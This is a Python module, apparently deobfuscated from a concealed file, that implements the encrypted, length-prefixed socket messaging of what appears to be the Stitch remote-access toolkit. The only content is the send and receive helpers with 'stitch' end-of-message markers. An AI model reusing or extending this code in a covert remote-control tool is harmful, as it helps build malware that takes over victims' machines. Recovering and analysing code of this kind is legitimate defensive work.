#!/usr/bin/env python3
# Decoded from Configuration/st_protocol.py
# Original was obfuscated with exec(SEC(INFO(...)))


import socket
import struct
# TODO: Replace wildcard import with specific imports
# TODO: Replace wildcard import with specific imports
from st_encryption import *

st_eof = base64.b64decode('c3RpdGNoNjI2aGN0aXRz')
st_complete = base64.b64decode('c3RpdGNoLjpjb21wbGV0ZTouY2h0aXRz')

def recvall(sock, count, size=False):
    buf = b''
    while count:
        newbuf = sock.recv(count)
        if not newbuf: return None
        buf += newbuf
        count -= len(newbuf)
    if size: return buf
    else: return decrypt(buf)

def send(sock, data, encryption=True):
    while data:
        if encryption:
            cmd = encrypt(data[:1024])
        else:
            cmd = data[:1024]
        length = len(cmd)
        sock.sendall(struct.pack('!i', length))
        sock.sendall(cmd)
        data = data[1024:]
    if encryption:
        eof = encrypt(st_eof)
    else:
        eof = st_eof
    eof_len = len(eof)
    sock.sendall(struct.pack('!i', eof_len))
    sock.sendall(eof)

def receive(sock,silent=False,timeout=True):
    full_response=''
    while True:
        lengthbuf = recvall(sock, 4, size=True)
        length, = struct.unpack('!i', lengthbuf)
        response = recvall(sock, length)
        if response != st_eof:
            full_response += response
        else:
            break
    return full_response
